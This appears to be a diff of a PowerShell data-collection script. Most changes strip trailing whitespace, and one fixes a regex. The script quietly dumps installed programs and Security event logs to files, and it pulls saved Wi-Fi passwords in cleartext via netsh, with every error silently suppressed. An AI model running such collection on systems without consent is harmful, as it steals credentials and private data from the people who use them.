@@ -142,9 +142,9 @@ CPU: $($cpuInfo.Name)
     } catch {}
     
     try {
-        Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* -ErrorAction SilentlyContinue | 
-            Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | 
-            Format-Table -AutoSize | 
+        Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* -ErrorAction SilentlyContinue |
+            Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
+            Format-Table -AutoSize |
             Out-File "$OutDirectory\installed_programs.txt" -Force -Encoding UTF8
     } catch {}
     
@@ -154,7 +154,7 @@ CPU: $($cpuInfo.Name)
         foreach ($profile in $wifiProfiles) {
             try {
                 $profileData = (netsh wlan show profile name="$profile" key=clear 2>$null)
-                $password = $profileData | Select-String "Key Content\W+\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
+                $password = $profileData | Select-String "Key Content\W+:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
                 if ($password) { 
                     $wifiData += [PSCustomObject]@{SSID=$profile; Password=$password} 
                 }
@@ -314,7 +314,7 @@ function Get-UserActivity {
     } catch {}
     
     try {
-        Get-EventLog -LogName Security -Newest 1000 -ErrorAction SilentlyContinue | 
+        Get-EventLog -LogName Security -Newest 1000 -ErrorAction SilentlyContinue |
             Export-Csv "$OutDirectory\security_events.csv" -Force -Encoding UTF8
     } catch {}
 }
